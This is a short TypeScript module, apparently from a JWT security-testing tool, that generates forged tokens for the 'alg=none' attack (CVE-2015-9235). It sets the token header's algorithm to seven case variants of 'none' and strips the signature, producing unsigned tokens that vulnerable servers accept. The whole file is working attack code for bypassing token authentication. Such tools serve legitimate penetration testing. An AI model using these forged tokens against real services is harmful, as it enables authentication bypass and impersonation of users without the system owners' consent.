import { buildJWT } from "../crypto/jwt.js";
import type { ParsedJWT, AttackResult } from "../types.js";
import { nanoid } from "../util.js";

const NONE_VARIANTS = ["none", "None", "NONE", "nOnE", "NoNe", "nONE", "NonE"];

export function buildNoneAttacks(parsed: ParsedJWT): AttackResult[] {
  const results: AttackResult[] = [];

  for (const alg of NONE_VARIANTS) {
    const header = { ...parsed.header, alg };
    // Remove kid/jku/x5u that could cause verification failures for a different reason
    results.push({
      id: nanoid(),
      technique: "none",
      techniqueName: `None Algorithm (alg="${alg}")`,
      description:
        `CVE-2015-9235: Sets alg to "${alg}" and strips the signature. ` +
        "Vulnerable servers accept unsigned tokens if they do not enforce signature presence.",
      modifiedJWT: buildJWT(header, parsed.payload, ""),
      timestamp: Date.now(),
    });
  }

  return results;
}
